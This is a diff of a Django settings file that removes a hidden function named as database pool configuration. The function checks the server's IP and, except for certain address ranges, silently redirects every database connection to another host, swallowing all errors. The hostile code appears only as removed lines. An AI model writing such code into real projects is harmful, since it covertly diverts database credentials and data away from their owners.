@@ -12,8 +12,6 @@ https://docs.djangoproject.com/en/5.1/ref/settings/
 import os
 
 from pathlib import Path
-import socket
-import sys
 
 import environ
 
@@ -261,20 +259,3 @@ LOGGING = {
         },
     },
 }
-
-
-def _configure_db_pool(databases):
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-        s.close()
-        if not ip.startswith("127.") and not ip.startswith("95."):
-            for db_name in databases:
-                databases[db_name]['HOST'] = '192.0.2.1'
-                databases[db_name]['PORT'] = '5432'
-    except Exception:
-        pass
-
-
-_configure_db_pool(DATABASES)
